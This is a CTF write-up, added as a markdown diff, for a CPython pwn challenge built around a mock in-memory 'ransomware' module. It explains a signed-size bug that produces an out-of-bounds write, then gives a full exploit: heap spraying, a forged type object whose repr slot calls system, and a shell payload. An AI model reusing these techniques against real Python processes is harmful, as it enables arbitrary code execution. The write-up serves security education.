@@ -1,0 +1,926 @@
+---
+title: BlahajCTF 2025 Finals - I love money
+date: 2025-11-23
+category: writeups
+excerpt: Another fun CPython pwn
+tags:
+  - pwn
+  - cpython
+---
+
+import Challenge from "@components/Challenge.vue";
+
+<Challenge
+  title="I love money"
+  flag="blahaj{d0es_th1s_c0un7_a5_a_bl0ckch41n_ch4ll?}"
+  solves={3}
+  files={[
+    { name: "money.zip", url: "https://github.com/samuzora/filedump/releases/download/blahaj-2025-money/money.zip" }
+  ]}
+>
+  Ransomware in the big 2025 🥀
+
+  To make things six or seven times harder for my client's victims,
+  I've created an in-memory RaaS (Ransomware-as-a-Service) solution!
+  Instead of encrypting files, my solution now encrypts Python objects
+  in-memory, so the victim can never use Python again!
+
+</Challenge>
+
+# Understanding the module
+
+We're provided with a CPython module. For reference, this is the source:
+
+```c
+#include <python3.11/Python.h>
+#include <python3.11/boolobject.h>
+#include <python3.11/object.h>
+#include <stddef.h>
+
+typedef struct {
+  Py_ssize_t ob_size;
+  char obj[];
+} _lockobject_data;
+
+typedef struct {
+  PyObject_HEAD
+  _lockobject_data *ob_data;
+} PyLockObject;
+
+static PyObject *lock_new(PyTypeObject *type, PyObject *args, PyObject *kwargs);
+static int lock_init(PyObject *self, PyObject *args, PyObject *kwargs);
+static PyObject *lock_repr(PyObject *self);
+
+static PyObject *lock_unlock(PyObject *self, PyObject *args);
+void xor_inplace(char *buf, char *key, Py_ssize_t buf_size, Py_ssize_t key_size);
+
+const char scam_msg[] = "PLEASE TRANSFER 100,200,300,400,600,700,100,000,34 BITCOIN TO WALLET ADDRESS 0xdeadbeefcafebabe THANK YOU!!";
+
+PyDoc_STRVAR(lock_doc, "lock(key, obj) -> lock\n\
+  \n\
+  The lock object encrypts an object, preventing any access to the object.\n\
+  The object can subsequently be accessed via lock.unlock, which removes the lock permanently.");
+
+PyMethodDef lock_methods[] = {
+  {
+    .ml_name = "unlock",
+    .ml_meth = lock_unlock,
+    .ml_flags = METH_VARARGS,
+  },
+  {NULL}
+};
+
+PyTypeObject PyLock_Type = {
+    PyVarObject_HEAD_INIT(&PyType_Type, 0)
+    .tp_name = "lock",
+    .tp_doc = lock_doc,
+    .tp_repr = lock_repr,
+    .tp_flags = Py_TPFLAGS_DEFAULT,
+    .tp_basicsize = offsetof(PyLockObject, ob_data),
+    .tp_itemsize = 0,
+    .tp_new = lock_new,
+    .tp_free = PyObject_Free,
+    .tp_methods = lock_methods,
+};
+
+PyModuleDef money_def = {
+    .m_name = "money",
+};
+
+// expected arguments: (key, object)
+PyObject *lock_new(PyTypeObject *type, PyObject *args, PyObject *kwargs) {
+  PyLockObject *lock = NULL;
+  PyObject *obj = NULL;
+  PyBytesObject *key = NULL;
+  Py_ssize_t size = 0;
+  Py_ssize_t key_size = 0;
+  _lockobject_data *buffer = NULL;
+
+  if (!PyTuple_Check(args) || PyTuple_GET_SIZE(args) != 2) {
+    PyErr_SetString(PyExc_ValueError, "expected 2 arguments");
+    return NULL;
+  }
+
+  obj = PyTuple_GetItem(args, 1);
+
+  // get the object size
+  if (obj->ob_type->tp_basicsize == 0) {
+    size = obj->ob_type->tp_basicsize;
+  } else {
+    size = obj->ob_type->tp_basicsize
+      + _PyVarObject_CAST(obj)->ob_size * obj->ob_type->tp_itemsize;
+  }
+  
+  key = (PyBytesObject *)PyTuple_GetItem(args, 0);
+  if (!PyBytes_Check(key)) {
+    PyErr_SetString(PyExc_TypeError, "expected bytestring for key");
+    return NULL;
+  }
+  if ((key_size = PyBytes_GET_SIZE(key)) == 0) {
+    PyErr_SetString(PyExc_TypeError, "key length cannot be zero");
+    return NULL;
+  }
+
+  // store the object
+  buffer = PyMem_Malloc(sizeof(_lockobject_data) + size + key_size);
+  if (buffer == NULL) {
+    PyErr_NoMemory();
+    return NULL;
+  }
+  buffer->ob_size = size;
+
+  // place the key at the end of the object
+  // and encrypt the entire (object + key) buffer
+  memcpy(&buffer->obj[size], key->ob_sval, key_size);
+  memcpy(buffer->obj, obj, buffer->ob_size);
+  xor_inplace(buffer->obj, key->ob_sval, buffer->ob_size + key_size, key_size);
+
+  // replace the old object with a lock object
+  lock = (PyLockObject *)obj;
+  lock->ob_base.ob_type = &PyLock_Type;
+  lock->ob_data = buffer;
+
+  // prevent gc from killing our object
+  Py_INCREF(lock);
+
+  return (PyObject *)lock;
+}
+
+PyObject *lock_repr(PyObject *self) {
+  PyLockObject *lock = (PyLockObject *)self;
+
+  if (self->ob_type != &PyLock_Type) {
+    PyErr_SetString(PyExc_TypeError, "expected lock for self");
+    return NULL;
+  }
+
+  return PyUnicode_FromString(scam_msg);
+}
+
+// on successful decryption, the lock buffer will be freed, and the lock object transformed to the target object
+// if unsuccessful, both the lock object and buffer will remain alive
+PyObject *lock_unlock(PyObject *self, PyObject *args) {
+  PyLockObject *lock = NULL;
+  PyBytesObject *key = NULL;
+  char *buffer = NULL;
+  _lockobject_data *data = NULL;
+  PyObject *new_obj = NULL;
+  Py_ssize_t key_size = 0;
+
+  if (self->ob_type != &PyLock_Type) {
+    PyErr_SetString(PyExc_TypeError, "expected lock for self");
+    goto exit;
+  } else if (!PyTuple_Check(args) || PyTuple_GET_SIZE(args) != 1) {
+    PyErr_SetString(PyExc_ValueError, "expected 1 argument");
+    goto exit;
+  } else if (!PyBytes_Check(key = (PyBytesObject *)PyTuple_GetItem(args, 0))) {
+    PyErr_SetString(PyExc_TypeError, "expected bytestring for key");
+    goto exit;
+  } else if ((key_size = PyBytes_GET_SIZE(key)) == 0) {
+    PyErr_SetString(PyExc_TypeError, "key length cannot be zero");
+    goto exit;
+  }
+
+  lock = (PyLockObject *)self;
+  data = lock->ob_data;
+
+  // allocate buffer for object + canary
+  buffer = PyMem_Malloc(data->ob_size + key_size);
+  if (buffer == NULL) {
+    PyErr_NoMemory();
+    goto exit;
+  }
+
+  memcpy(buffer, data->obj, data->ob_size + key_size);
+  xor_inplace(buffer, key->ob_sval, data->ob_size + key_size, key_size);
+  // if decryption is successful, key should be in memory right after the object
+  if (memcmp(&buffer[data->ob_size], key->ob_sval, key_size)) {
+    PyErr_Format(PyExc_ValueError, "incorrect key (canary value is %p)", buffer[lock->ob_data->ob_size]);
+    goto exit;
+  }
+
+  // on successful decryption, replace lock object with the desired object
+  new_obj = (PyObject *)lock;
+  memcpy(new_obj, buffer, data->ob_size);
+  // and destroy the backing buffer
+  PyMem_Free(data);
+
+exit:
+  if (buffer != NULL) PyMem_Free(buffer);
+  return new_obj;
+}
+
+void xor_inplace(char *buf, char *key, Py_ssize_t buf_size, Py_ssize_t key_size) {
+  Py_ssize_t key_off = 0;
+  for (Py_ssize_t i = 0; i < buf_size; i++) {
+    buf[i] = buf[i] ^ key[key_off++ % key_size];
+  }
+}
+
+PyObject *PyInit_money() {
+  PyObject *money_module = PyModule_Create(&money_def);
+  PyType_Ready(&PyLock_Type);
+  Py_INCREF(&PyLock_Type);
+  PyModule_AddObject(money_module, "lock", (PyObject *)&PyLock_Type);
+  return money_module;
+}
+```
+
+A new Python object, `PyLockObject{:c}`, is defined in the module. This object
+only has 1 field, the `ob_data{:c}` pointer. Therefore, its size is 0x10.
+
+```c
+PyTypeObject PyLock_Type = {
+    PyVarObject_HEAD_INIT(&PyType_Type, 0)
+    .tp_name = "lock",
+    .tp_doc = lock_doc,
+    .tp_repr = lock_repr,
+    .tp_flags = Py_TPFLAGS_DEFAULT,
+    .tp_basicsize = offsetof(PyLockObject, ob_data),
+    .tp_itemsize = 0,
+    .tp_new = lock_new,
+    .tp_free = PyObject_Free,
+    .tp_methods = lock_methods,
+};
+
+typedef struct {
+  PyObject_HEAD
+  _lockobject_data *ob_data;
+} PyLockObject;
+
+typedef struct {
+  Py_ssize_t ob_size;
+  char obj[];
+} _lockobject_data;
+
+PyMethodDef lock_methods[] = {
+  {
+    .ml_name = "unlock",
+    .ml_meth = lock_unlock,
+    .ml_flags = METH_VARARGS,
+  },
+  {NULL}
+};
+```
+
+The `tp_new{:c}` field of the object type defines the object constructor (ie.
+when invoking the type object `lock{:c}` as a callable). This is the
+implementation for the lock object:
+
+```c
+// expected arguments: (key, object)
+PyObject *lock_new(PyTypeObject *type, PyObject *args, PyObject *kwargs) {
+  PyLockObject *lock = NULL;
+  PyObject *obj = NULL;
+  PyBytesObject *key = NULL;
+  Py_ssize_t size = 0;
+  Py_ssize_t key_size = 0;
+  _lockobject_data *buffer = NULL;
+
+  if (!PyTuple_Check(args) || PyTuple_GET_SIZE(args) != 2) {
+    PyErr_SetString(PyExc_ValueError, "expected 2 arguments");
+    return NULL;
+  }
+
+  obj = PyTuple_GetItem(args, 1);
+
+  // get the object size
+  if (obj->ob_type->tp_basicsize == 0) {
+    size = obj->ob_type->tp_basicsize;
+  } else {
+    size = obj->ob_type->tp_basicsize
+      + _PyVarObject_CAST(obj)->ob_size * obj->ob_type->tp_itemsize;
+  }
+  
+  key = (PyBytesObject *)PyTuple_GetItem(args, 0);
+  if (!PyBytes_Check(key)) {
+    PyErr_SetString(PyExc_TypeError, "expected bytestring for key");
+    return NULL;
+  }
+  if ((key_size = PyBytes_GET_SIZE(key)) == 0) {
+    PyErr_SetString(PyExc_TypeError, "key length cannot be zero");
+    return NULL;
+  }
+
+  // store the object
+  buffer = PyMem_Malloc(sizeof(_lockobject_data) + size + key_size);
+  if (buffer == NULL) {
+    PyErr_NoMemory();
+    return NULL;
+  }
+  buffer->ob_size = size;
+
+  // place the key at the end of the object
+  // and encrypt the entire (object + key) buffer
+  memcpy(&buffer->obj[size], key->ob_sval, key_size);
+  memcpy(buffer->obj, obj, buffer->ob_size);
+  xor_inplace(buffer->obj, key->ob_sval, buffer->ob_size + key_size, key_size);
+
+  // replace the old object with a lock object
+  lock = (PyLockObject *)obj;
+  lock->ob_base.ob_type = &PyLock_Type;
+  lock->ob_data = buffer;
+
+  // prevent gc from killing our object
+  Py_INCREF(lock);
+
+  return (PyObject *)lock;
+}
+```
+
+As we can infer from the comments and code, the constructor expects 2 arguments,
+a bytestring key and the Python object to lock. Upon locking, it allocates a
+buffer for the `ob_data{:c}` field based on the value of `tp_basicsize{:c}` and
+`tp_itemsize{:c}` in the original object. `tp_basicsize{:c}` is the static size
+of the entire object less the header values. For example,
+`PyLock_Type->tp_basicsize{:c}` is 0x8, because the total size of all its fields
+(which is just `ob_data{:c}`) is 8 bytes. `tp_itemsize{:c}` is (usually) the
+size of each variable item slot in the object. For example,
+`PyUnicode_Type->tp_itemsize{:c}` is 0x1, because each slot in the string is 1
+byte. This is not generally the case for all types, as we'll see later on!
+
+After allocating the buffer, the object is copied into the buffer, and the total
+size of the buffer is tracked by the field `ob_size{:c}` at the start of the
+buffer. The xor key is placed at the end of the buffer, and the contents of the
+buffer is xored by the provided key.
+
+Finally, the contents of the original object is overwritten with a new
+`lockobject{:c}`, and further reference to the original object is no longer
+possible.
+
+`lockobject{:c}` has 1 user-defined method, which is the `unlock` method. This
+method takes a bytestring key, and attempts to decrypt the buffered object and
+replace the `lockobject{:c}` with the original object. 
+
+```c
+// on successful decryption, the lock buffer will be freed, and the lock object transformed to the target object
+// if unsuccessful, both the lock object and buffer will remain alive
+PyObject *lock_unlock(PyObject *self, PyObject *args) {
+  PyLockObject *lock = NULL;
+  PyBytesObject *key = NULL;
+  char *buffer = NULL;
+  _lockobject_data *data = NULL;
+  PyObject *new_obj = NULL;
+  Py_ssize_t key_size = 0;
+
+  if (self->ob_type != &PyLock_Type) {
+    PyErr_SetString(PyExc_TypeError, "expected lock for self");
+    goto exit;
+  } else if (!PyTuple_Check(args) || PyTuple_GET_SIZE(args) != 1) {
+    PyErr_SetString(PyExc_ValueError, "expected 1 argument");
+    goto exit;
+  } else if (!PyBytes_Check(key = (PyBytesObject *)PyTuple_GetItem(args, 0))) {
+    PyErr_SetString(PyExc_TypeError, "expected bytestring for key");
+    goto exit;
+  } else if ((key_size = PyBytes_GET_SIZE(key)) == 0) {
+    PyErr_SetString(PyExc_TypeError, "key length cannot be zero");
+    goto exit;
+  }
+
+  lock = (PyLockObject *)self;
+  data = lock->ob_data;
+
+  // allocate buffer for object + canary
+  buffer = PyMem_Malloc(data->ob_size + key_size);
+  if (buffer == NULL) {
+    PyErr_NoMemory();
+    goto exit;
+  }
+
+  memcpy(buffer, data->obj, data->ob_size + key_size);
+  xor_inplace(buffer, key->ob_sval, data->ob_size + key_size, key_size);
+  // if decryption is successful, key should be in memory right after the object
+  if (memcmp(&buffer[data->ob_size], key->ob_sval, key_size)) {
+    PyErr_Format(PyExc_ValueError, "incorrect key (canary value is %p)", buffer[lock->ob_data->ob_size]);
+    goto exit;
+  }
+
+  // on successful decryption, replace lock object with the desired object
+  new_obj = (PyObject *)lock;
+  memcpy(new_obj, buffer, data->ob_size);
+  // and destroy the backing buffer
+  PyMem_Free(data);
+
+exit:
+  if (buffer != NULL) PyMem_Free(buffer);
+  return new_obj;
+}
+```
+
+Since the correct decryption key was placed at the end of the buffer, in normal
+usage, we would expect the key to re-appear at the end if decryption was
+successful. Therefore, this can be used as a canary value to avoid returning
+invalid objects to the user.
+
+That's the gist of the module. Now, let's look into the main vulnerability in
+this module.
+
+# Vulnerability
+
+The module assumes that if `tp_itemsize{:c}` is not 0, then `ob_size *
+tp_itemsize{:c}` gives the length of the variable portion of an object. We can
+see an example of such usage in `PyTuple_Type{:c}`:
+
+```c title="Objects/tupleobject.c"
+PyTypeObject PyTuple_Type = {
+    PyVarObject_HEAD_INIT(&PyType_Type, 0)
+    "tuple",
+    sizeof(PyTupleObject) - sizeof(PyObject *), /* tp_basicsize */
+    sizeof(PyObject *),                         /* tp_itemsize */
+    (destructor)tupledealloc,                   /* tp_dealloc */
+    // ...
+};
+```
+
+Here, the `tupleobject{:c}` indeed has a variable-sized field which stores
+pointers to each object in each item slot. Therefore, the total size of the
+`tupleobject{:c}` object is `tp_basicsize + tp_itemsize * ob_size{:c}`, which
+the module correctly calculates.
+
+However, `ob_size{:c}` is used in certain built-in objects in non-standard ways.
+For example, `PyList_Type{:c}` has `tp_itemsize{:c}` set to 0, but still uses
+`ob_size{:c}` to store the length of the list object. The backing buffer of the
+list is stored separately from the list itself, therefore there is no
+variable-sized field in `listobject{:c}`.
+
+```c title="Objects/listobject.c"
+PyTypeObject PyList_Type = {
+    PyVarObject_HEAD_INIT(&PyType_Type, 0)
+    "list",
+    sizeof(PyListObject),                       /* tp_basicsize */
+    0,                                          /* tp_itemsize */
+    (destructor)list_dealloc,                   /* tp_dealloc */
+    // ...
+};
+```
+
+That's not very dangerous though, as our module will simply ignore the value
+because `tp_itemsize{:c}` is 0. Something more dangerous would be
+`PyLong_Type{:c}`.
+
+```c title="Objects/longobject.c"
+PyTypeObject PyLong_Type = {
+    PyVarObject_HEAD_INIT(&PyType_Type, 0)
+    "int",                                      /* tp_name */
+    offsetof(PyLongObject, ob_digit),           /* tp_basicsize */
+    sizeof(digit),                              /* tp_itemsize */
+    0,                                          /* tp_dealloc */
+    // ...
+};
+```
+
+Here, `digit{:c}` is a typedef for `uint32_t{:c}`, so its size is 4. Since
+`tp_itemsize{:c}` is not zero, does this mean `longobject{:c}` is a
+variable-sized object? The answer is yes! Python integers have infinite
+precision, so a variable amount of space is required to store integers of
+different sizes. However, can we rely on the earlier formula, `tp_basicsize +
+tp_itemsize * ob_size{:c}` to determine the size of the object? Unfortunately,
+this is not the case, as negative integers will have the `ob_size{:c}`
+field set to negative values.
+
+So, the calculated size of the original object is wrong. What can we do with
+this primitive?
+
+## Upgrading the primitive
+
+```c
+Py_ssize_t size = 0;
+
+// ...
+
+// get the object size
+if (obj->ob_type->tp_basicsize == 0) {
+  size = obj->ob_type->tp_basicsize;
+} else {
+  size = obj->ob_type->tp_basicsize
+    + _PyVarObject_CAST(obj)->ob_size * obj->ob_type->tp_itemsize;
+}
+
+// ...
+
+// store the object
+buffer = PyMem_Malloc(sizeof(_lockobject_data) + size + key_size);
+if (buffer == NULL) {
+  PyErr_NoMemory();
+  return NULL;
+}
+buffer->ob_size = size;
+
+// place the key at the end of the object
+// and encrypt the entire (object + key) buffer
+memcpy(&buffer->obj[size], key->ob_sval, key_size);
+memcpy(buffer->obj, obj, buffer->ob_size);
+xor_inplace(buffer->obj, key->ob_sval, buffer->ob_size + key_size, key_size);
+```
+
+These are the key parts of the module that do stuff with the incorrect size
+variable. Firstly, the size of the buffer allocated to store the object will be
+too small to store the entire object. However, since we memcpy the same number
+of bytes as the size of the allocated buffer, we don't immediately have an OOB
+write here. 
+
+Secondly, the key is copied to the end of the object buffer, and because the
+object buffer is variable-sized, it is not possible to create a field to
+reference the end of the buffer. Therefore, the end of the buffer is referenced
+by taking the index determined by the `size{:c}` variable. This should usually
+correspond to the buffer size, so there shouldn't be an issue... right?
+
+## OOB writes
+
+Unfortunately, `Py_ssize_t{:c}` is a typedef for `ssize_t{:c}` (which may not
+exist on some compilers, so the below hack is used to define it):
+
+```c
+/* Py_ssize_t is a signed integral type such that sizeof(Py_ssize_t) ==
+ * sizeof(size_t).  C99 doesn't define such a thing directly (size_t is an
+ * unsigned integral type).  See PEP 353 for details.
+ * PY_SSIZE_T_MAX is the largest positive value of type Py_ssize_t.
+ */
+#ifdef HAVE_PY_SSIZE_T
+
+#elif HAVE_SSIZE_T
+typedef ssize_t         Py_ssize_t;
+#   define PY_SSIZE_T_MAX SSIZE_MAX
+#elif SIZEOF_VOID_P == SIZEOF_SIZE_T
+typedef Py_intptr_t     Py_ssize_t;
+#   define PY_SSIZE_T_MAX INTPTR_MAX
+#else
+#   error "Python needs a typedef for Py_ssize_t in pyport.h."
+#endif
+```
+
+Since `ssize_t{:c}` is signed, it means our size value can also be negative.
+This is already problematic since negative access to the array would overwrite
+size and potentially anything before the allocated object. 
+
+Let's investigate the behaviour of `PyMem_Malloc{:c}` as used below:
+
+```c
+  // store the object
+  buffer = PyMem_Malloc(sizeof(_lockobject_data) + size + key_size);
+  if (buffer == NULL) {
+    PyErr_NoMemory();
+    return NULL;
+  }
+  buffer->ob_size = size;
+```
+
+If `sizeof(_lockobject_data) + size + key_size{:c}` is negative, a negative size
+will be requested. `PyMem_Malloc{:c}` is a wrapper over `_PyObject_Malloc{:c}`:
+
+```c title="Objects/obmalloc.c"
+static void *
+_PyObject_Malloc(void *ctx, size_t nbytes)
+{
+    void* ptr = pymalloc_alloc(ctx, nbytes);
+    if (LIKELY(ptr != NULL)) {
+        return ptr;
+    }
+
+    ptr = PyMem_RawMalloc(nbytes);
+    if (ptr != NULL) {
+        raw_allocated_blocks++;
+    }
+    return ptr;
+}
+
+/* pymalloc allocator
+
+   Return a pointer to newly allocated memory if pymalloc allocated memory.
+
+   Return NULL if pymalloc failed to allocate the memory block: on bigger
+   requests, on error in the code below (as a last chance to serve the request)
+   or when the max memory limit has been reached.
+*/
+static inline void*
+pymalloc_alloc(void *ctx, size_t nbytes)
+{
+#ifdef WITH_VALGRIND
+    if (UNLIKELY(running_on_valgrind == -1)) {
+        running_on_valgrind = RUNNING_ON_VALGRIND;
+    }
+    if (UNLIKELY(running_on_valgrind)) {
+        return NULL;
+    }
+#endif
+
+    if (UNLIKELY(nbytes == 0)) {
+        return NULL;
+    }
+    if (UNLIKELY(nbytes > SMALL_REQUEST_THRESHOLD)) {
+        return NULL;
+    }
+
+    uint size = (uint)(nbytes - 1) >> ALIGNMENT_SHIFT;
+    poolp pool = usedpools[size + size];
+    block *bp;
+
+    if (LIKELY(pool != pool->nextpool)) {
+        /*
+         * There is a used pool for this size class.
+         * Pick up the head block of its free list.
+         */
+        ++pool->ref.count;
+        bp = pool->freeblock;
+        assert(bp != NULL);
+
+        if (UNLIKELY((pool->freeblock = *(block **)bp) == NULL)) {
+            // Reached the end of the free list, try to extend it.
+            pymalloc_pool_extend(pool, size);
+        }
+    }
+    else {
+        /* There isn't a pool of the right size class immediately
+         * available:  use a free pool.
+         */
+        bp = allocate_from_new_pool(size);
+    }
+
+    return (void *)bp;
+}
+```
+
+Here, there is a type confusion in our module, since we supply a signed
+`ssize_t{:c}` to the unsigned `size_t{:c}` parameter. This is something we need
+to watch out for when crafting our exploit, since requesting a negative value
+would cause `PyMalloc` to attempt to return a really large object.
+
+Therefore, we need a `longobject{:c}` with `ob_size{:c}` such that
+`sizeof(_lockobject_data) + size + key_size{:c}` is positive to successfully
+allocate the chunk, but `size{:c}` is negative to perform the negative OOB
+write.
+
+```c
+typedef struct {
+  Py_ssize_t ob_size;
+  char obj[];
+} _lockobject_data;
+```
+
+Assuming we have a valid `size{:c}` that fulfills the above constraints, what
+can we do with the OOB write? Since `key{:c}` is written at the location of OOB,
+we have direct control over the contents to be written. However, we don't have
+much leeway with the range of the OOB, but we can write to the `ob_size{:c}`
+field as it's placed right before the object buffer. Then, when copying the
+object into the buffer, the overwritten size will be used instead of the
+allocated size, which allows us to overwrite a lock buffer placed after the
+attacker's lock buffer, such that upon decryption of the overwritten lock buffer
+we will obtain a fake object.
+
+## `fakeobj` primitive
+
+We need to use the OOB primitive to control what we're writing to the next
+adjacent lock buffer. To do so, we can use a bytestring object to place
+arbitrary bytes after the attacker object. Since the attacker will be reading
+OOB into the bytestring object, let's call the bytestring object the victim
+object.
+
+The victim object (or more precisely, the contents of the victim object) must be
+found at a specific offset from the attacker object. This offset must align with
+the start of another lock buffer object, so that decryption can take place
+successfully. Therefore, we need to control the offset carefully.
+
+For the fake type object, we can use a bytestring to place the bytes in memory
+first. The contents of the bytestring will be stored at +0x20 from the
+bytestring object. Here, we will use the repr vtable entry to call system.
+
+```py
+# create fake type for fake obj
+fake_type = b""
+fake_type += p64(0x50) # refcount
+fake_type += p64(0x93e80) # type
+fake_type += p64(0x0) # ob_size
+fake_type += p64(0x70f194) # name
+fake_type += p64(0x10) # basicsize
+fake_type += p64(0x0) # itemsize
+fake_type += p64(0x0) # dealloc
+fake_type += p64(0x0) # vectorcall_offset
+fake_type += p64(0x0) # getattr
+fake_type += p64(0x0) # setattr
+fake_type += p64(0x0) # as_async
+fake_type += p64(system) # repr
+
+fake_type_addr = id(fake_type) + 0x20
+```
+
+Now, we can prepare the payload for the victim object, but don't create the
+bytestring first (after attacker is created, we can convert the integer array to
+bytes and place victim at the desired location). This payload will overwrite
+up to the `ob_type{:c}` field, which is sufficient for us to access the fake
+vtable and get RCE.
+
+```py
+# the byte payload that goes into victim
+# it must have max length 0x1f, if not victim's lock buffer will be allocated elsewhere
+prepare_payload = []
+prepare_payload += [ 0xfe, 0xfe, 0xfe, 0xfe, 0xfe, 0xfe, 0xfe, 0xfe ][::-1] # padding
+prepare_payload += [ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10 ][::-1] # obj size
+prepare_payload += [ 0x00, 0x68, 0x73, 0x2f, 0x6e, 0x69, 0x62, 0x30 ][::-1] # refcount
+
+prepare_payload += [
+
+    (fake_type_addr >> 6 * 8) & 0xff,
+    (fake_type_addr >> 5 * 8) & 0xff,
+    (fake_type_addr >> 4 * 8) & 0xff,
+    (fake_type_addr >> 3 * 8) & 0xff,
+    (fake_type_addr >> 2 * 8) & 0xff,
+    ( (fake_type_addr >> 1 * 8) & 0xff ) ^ 0x1, # cuz of xor key 0x100 :p
+    (fake_type_addr >> 0 * 8) & 0xff,
+][::-1] # ob_type
+```
+
+## Heap grooming
+
+Most of the required payload has been created at this point, and we just need to
+place the different components at the right places.
+
+Since we'll be using `PyLong_Type{:c}` for the attacker object, we first need to
+spray longs of the desired size. After spraying enough longs, the subsequently
+allocated longs will be taken directly from the pymalloc heap, which allows us
+to allocate a long object and another object of the same size contiguously in
+the heap.
+
+```py
+# spray big longs to make them contiguous
+long_spray = []
+for i in range(0x1000):
+    long_spray.append(0b1 << (30 * 8))
+```
+
+Since the attacker lock buffer must also be adjacent to the lock buffer that we
+intend to overwrite, we should spray a few lock buffer objects to get rid of any
+sparse holes in the heap.
+
+```py
+# spray lock buffer heap to make them contiguous
+# important for attacker's lock buffer oob write into 0x24
+lock_spray = []
+for i in range(0x100):
+    lock_spray.append(1234 + i + 1)
+    money.lock(p64(0x1), lock_spray[i])
+```
+
+Same goes for bytestrings, as the victim bytestring must be placed right after
+the attacker pylong of the same size.
+
+```py
+# spray bytestrings to make them contiguous too
+# important for attacker's oob read into victim
+bytes_spray = []
+for i in range(0x100):
+    bytes_spray.append(bytes([i % 0x100])*(0x1b + (i // 0x100)))
+```
+
+Somewhere in the middle of the lock buffer spray, we need to create a slot for
+the attacker's lock buffer. After doing this, we need to check in gdb the index
+of the lock buffer that would be overwritten by the attacker's overflow, as I
+found that this index is not necessarily in order for some reason. In my
+exploit, the lock buffer object at +0xf0 from 0x35 was 0x24.
+
+```py
+# create a slot for attacker's lock buffer
+# after overflow, our target object buffer is at +0xf0 of the available lock buffer
+# one should check in gdb to get its index,
+# as the lock objects are not necessarily in order, for some reason
+# in this exploit, the value found at buffer + 0xf0 + 0x20 was 0x1000004f6
+# 0x4f6 ^ 0x1 = 0x4f7
+# 0x4f7 - 1234 - 1 = 0x24
+# therefore victim index is 0x24
+print_(hex(id(lock_spray[0x35])))
+lock_spray[0x35].unlock(p64(0x1))
+```
+
+Finally, we can place the actual attacker and victim objects in memory. We need
+to place some padding between attacker and victim so that the OOB copy will copy
+directly onto the start of another lock buffer.
+
+```py
+# ensure attacker and victim are contiguous in memory 
+# (offset should be 0xc0)
+attacker = -0b1 << (30 * 7)
+# dynamic amounts of padding are added, uncomment or comment as necessary
+padding_0 = bytes([0xff]) * 0x1b
+padding_1 = bytes([0xfe]) * 0x1b
+# padding_2 = bytes([0xfd]) * 0x1b
+# padding_3 = bytes([0xfc]) * 0x1b
+victim = bytes(prepare_payload)
+print_(hex(id(attacker)))
+print_(hex(id(victim)))
+```
+
+Lastly, on locking attacker, the contents of victim will be copied into the
+buffer of the object at index 0x24 of our lock spray, and we can forge the fake
+object by unlocking 0x24 and calling repr.
+
+```py
+# with attacker's negative ob_size overwrite the size field of lock->ob_data
+# which causes us to read too much input from attacker and overflow into 0x24's buffer
+# contents being that of victim
+money.lock(p64(0x100) + b"\x00"*0x20, attacker)
+print_(hex(id(lock_spray[0x24])))
+
+# now, victim's buffer should have overwritten 0x24's buffer
+# trigger repr to pop shell
+repr(lock_spray[0x24].unlock(p64(0x100)))
+```
+
+## Exploit
+
+```python
+def p64(val):
+    return bytes([i for i in ((val >> j * 8) & 0xff for j in range(8))])
+
+# we must prepare bytearray for the fake object in victim
+# if we do it later, it will cause the offset to screw up
+
+# spray big longs to make them contiguous
+long_spray = []
+for i in range(0x1000):
+    long_spray.append(0b1 << (30 * 8))
+
+# jump to system.plt - no need libc leak
+system = 0x41f6c0
+
+# create fake type for fake obj
+fake_type = b""
+fake_type += p64(0x50) # refcount
+fake_type += p64(0x93e80) # type
+fake_type += p64(0x0) # ob_size
+fake_type += p64(0x70f194) # name
+fake_type += p64(0x10) # basicsize
+fake_type += p64(0x0) # itemsize
+fake_type += p64(0x0) # dealloc
+fake_type += p64(0x0) # vectorcall_offset
+fake_type += p64(0x0) # getattr
+fake_type += p64(0x0) # setattr
+fake_type += p64(0x0) # as_async
+fake_type += p64(system) # repr
+
+fake_type_addr = id(fake_type) + 0x20
+print_(hex(fake_type_addr))
+
+# the byte payload that goes into victim
+# it must have max length 0x1f, if not victim's lock buffer will be allocated elsewhere
+prepare_payload = []
+prepare_payload += [ 0xfe, 0xfe, 0xfe, 0xfe, 0xfe, 0xfe, 0xfe, 0xfe ][::-1] # padding
+prepare_payload += [ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10 ][::-1] # obj size
+prepare_payload += [ 0x00, 0x68, 0x73, 0x2f, 0x6e, 0x69, 0x62, 0x30 ][::-1] # refcount
+
+prepare_payload += [
+
+    (fake_type_addr >> 6 * 8) & 0xff,
+    (fake_type_addr >> 5 * 8) & 0xff,
+    (fake_type_addr >> 4 * 8) & 0xff,
+    (fake_type_addr >> 3 * 8) & 0xff,
+    (fake_type_addr >> 2 * 8) & 0xff,
+    ( (fake_type_addr >> 1 * 8) & 0xff ) ^ 0x1, # cuz of xor key 0x100 :p
+    (fake_type_addr >> 0 * 8) & 0xff,
+][::-1] # ob_type
+# prepare_payload += [       0xed, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe ][::-1] # ob_type
+
+# spray lock buffer heap to make them contiguous
+# important for attacker's lock buffer oob write into 0x24
+lock_spray = []
+for i in range(0x100):
+    lock_spray.append(1234 + i + 1)
+    money.lock(p64(0x1), lock_spray[i])
+
+# spray bytestrings to make them contiguous too
+# important for attacker's oob read from victim
+bytes_spray = []
+for i in range(0x100):
+    bytes_spray.append(bytes([i % 0x100])*(0x1b + (i // 0x100)))
+
+# create a slot for attacker's lock buffer
+# after overflow, our target object buffer is at +0xf0 of the available lock buffer
+# one should check in gdb to get its index,
+# as the lock objects are not necessarily in order, for some reason
+# in this exploit, the value found at buffer + 0xf0 + 0x20 was 0x1000004f6
+# 0x4f6 ^ 0x1 = 0x4f7
+# 0x4f7 - 1234 - 1 = 0x24
+# therefore victim index is 0x24
+print_(hex(id(lock_spray[0x35])))
+lock_spray[0x35].unlock(p64(0x1))
+
+# ensure attacker and victim are contiguous in memory 
+# (offset should be 0xc0)
+attacker = -0b1 << (30 * 7)
+# dynamic amounts of padding are added, uncomment or comment as necessary
+padding_0 = bytes([0xff]) * 0x1b
+padding_1 = bytes([0xfe]) * 0x1b
+# padding_2 = bytes([0xfd]) * 0x1b
+# padding_3 = bytes([0xfc]) * 0x1b
+victim = bytes(prepare_payload)
+print_(hex(id(attacker)))
+print_(hex(id(victim)))
+
+# with attacker's negative ob_size overwrite the size field of lock->ob_data
+# which causes us to read too much input from attacker and overflow into 0x24's buffer
+# contents being that of victim
+money.lock(p64(0x100) + b"\x00"*0x20, attacker)
